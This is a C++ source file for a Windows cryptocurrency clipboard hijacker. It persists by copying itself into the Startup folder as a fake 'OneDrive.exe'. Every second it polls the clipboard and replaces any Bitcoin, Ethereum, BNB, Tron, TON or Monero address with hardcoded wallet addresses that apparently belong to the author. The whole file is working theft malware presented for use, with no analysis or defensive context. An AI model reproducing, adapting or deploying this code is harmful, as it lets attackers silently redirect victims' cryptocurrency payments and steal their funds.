#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <string>
#include <vector>
#pragma comment(lib, "User32.lib")

std::vector<std::string> mAddress{
    "bc1qmsyzncyge2uwhqn47m40sa08xq7qh4yllyfvh3", // Bitcoin (BTC)
    "0x76c104E30b0CCa79cf61f51A51043a3a1776d5B6", // Ethereum (ETH) and BSC
    "0x36B9Fd9A926cAc2bF7Bc7425Ad0e1F7575369A47", // Binance Coin (BNB)
    "TJsKM4C3K4UpiRmWbhJFeyekFUF5n96AVX", // Tron (TRX)
    "0x76c104E30b0CCa79cf61f51A51043a3a1776d5B6", // Ton (TON)
    "41nizz95at5QEZ9ZhLi2mUHVHEHhbDSXB4Q3uMNFh5H8H7w9TtRzZ3qQkkMdkf7B3v7TVMCZ63gmqgaSkWtgjnv5L9Ke7cR"  // Monero (XMR)
};

void addToStartup() {
    std::string sPath = getenv("APPDATA");
    sPath += "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDrive.exe";

    char cBuffer[1024];
    GetModuleFileName(NULL, cBuffer, 1024);
    
    if (strcmp(cBuffer, sPath.c_str()) != 0)
        CopyFile(cBuffer, sPath.c_str(), false);
}

void setClipboardText(const char* text) {
    int size = MultiByteToWideChar(CP_UTF8, 0, text, -1, nullptr, 0);
    if (size < 0)
        return;

    if (OpenClipboard(NULL)) {
        EmptyClipboard();
        HGLOBAL hGlobal = GlobalAlloc(GMEM_ZEROINIT | GMEM_MOVEABLE | GMEM_DDESHARE, (size + 1) * sizeof(WCHAR));
        if (hGlobal != NULL) {
            LPWSTR lpszData = (LPWSTR)GlobalLock(hGlobal);
            if (lpszData != NULL) {
                MultiByteToWideChar(CP_UTF8, 0, text, -1, lpszData, size);
                GlobalUnlock(hGlobal);
                SetClipboardData(CF_UNICODETEXT, hGlobal);
            }
        }
        CloseClipboard();
    }
}

std::string getClipboardText()
{
    std::string text = "";
    if (OpenClipboard(NULL)) {
        HANDLE hData = GetClipboardData(CF_TEXT);
        if (hData == NULL)
            return "";

        char* pszText = static_cast<char*>(GlobalLock(hData));
        if (pszText == NULL)
            return "";

        text = pszText;

        GlobalUnlock(hData);
        CloseClipboard();
    }
    return text;
}

void checkBitcoinAddress(std::string sClipboard) {
    bool isBitcoinAddr = false;

    if (sClipboard.length() == 42 && sClipboard.substr(0, 3) == "bc1") // Bech32 (P2WPKH)
        isBitcoinAddr = true;
    else if (sClipboard.length() == 34 && sClipboard[0] == '1')        // Base58 (P2PKH)
        isBitcoinAddr = true;
    else if (sClipboard.length() == 34 && sClipboard[0] == '3')        // Base58 (P2SH)
        isBitcoinAddr = true;

    if (isBitcoinAddr)
        setClipboardText(mAddress[0].c_str());
};

void checkEthereumAddress(std::string sClipboard) {
    if (sClipboard.length() == 42 && sClipboard.substr(0, 2) == "0x")
        setClipboardText(mAddress[1].c_str());
};

void checkBinanceCoinAddress(std::string sClipboard) {
    if (sClipboard.length() == 42 && sClipboard.substr(0, 4) == "bnb1")
        setClipboardText(mAddress[2].c_str());
}

void checkTronAdress(std::string sClipboard) {
    if (sClipboard.length() == 34 && sClipboard[0] == 'T')
        setClipboardText(mAddress[3].c_str());
}

void checkTonAddress(std::string sClipboard) {
    if (sClipboard.length() == 48 && 
        (sClipboard.find("-") != std::string::npos || sClipboard.find("_") != std::string::npos))
        setClipboardText(mAddress[4].c_str());
}

void checkMoneroAddress(std::string sClipboard) {
    if (sClipboard.length() == 95 && sClipboard[0] == '4')
        setClipboardText(mAddress[5].c_str());
}

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    addToStartup(); // Simple startup ;D

    while (true) {
        std::string sClipboard = getClipboardText();

        checkBitcoinAddress(sClipboard);
        checkEthereumAddress(sClipboard);
        checkBinanceCoinAddress(sClipboard); // Issue with memo (use address without memo)
        checkTronAdress(sClipboard);
        checkTonAddress(sClipboard);
        checkMoneroAddress(sClipboard);

        Sleep(1000);
    }
};
